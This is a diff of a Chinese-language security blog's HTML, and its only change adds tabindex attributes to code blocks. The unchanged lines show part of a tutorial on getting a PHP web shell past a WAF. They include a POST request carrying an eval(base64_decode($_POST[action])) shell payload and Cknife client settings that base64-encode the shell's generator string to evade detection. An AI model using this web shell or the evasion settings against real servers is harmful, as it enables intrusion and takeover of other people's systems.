@@ -118,7 +118,7 @@ $___Ss <span style="color:#f92672">=</span> <span style="color:#a6e22e">chr</spa
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x05.png" alt="手工"></p>
 <h2 id="0x02-站在waf的角度考虑">0x02 站在WAF的角度考虑</h2>
 <p>先来看看数据包：</p>
-<pre><code>POST /3.php HTTP/1.1
+<pre tabindex="0"><code>POST /3.php HTTP/1.1
 User-Agent: Java/1.8.0_131
 Host: 192.168.1.103
 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
@@ -138,12 +138,12 @@ username=@eval(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYX
 <p>最终我通过了另一种方式去更改传递数据。</p>
 <h2 id="0x03-just-do-it">0x03 Just Do it</h2>
 <p>先看看Cknife的配置文件<code>Config.ini</code>说明：</p>
-<pre><code>PARAM1=z1         			       参数1 
+<pre tabindex="0"><code>PARAM1=z1         			       参数1 
 PARAM2=z2         			       参数2 
 PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
 PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
 </code></pre><p>最关键的就是<code>PHP_MAKE</code>参数了，我们将其改成base64编码后的结果。</p>
-<pre><code>PHP_BASE64=1
+<pre tabindex="0"><code>PHP_BASE64=1
 PHP_MAKE=ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk\=
 </code></pre><p>这里多了一个<code>\</code>，是jar程序自己转码的。读者可以将此<code>code</code>去<code>base64_decode</code>一下，看看是不是 <code>@eval(base64_decode($_POST[action]));</code></p>
 <p>那么此时是否真的能够Bypass呢？</p>
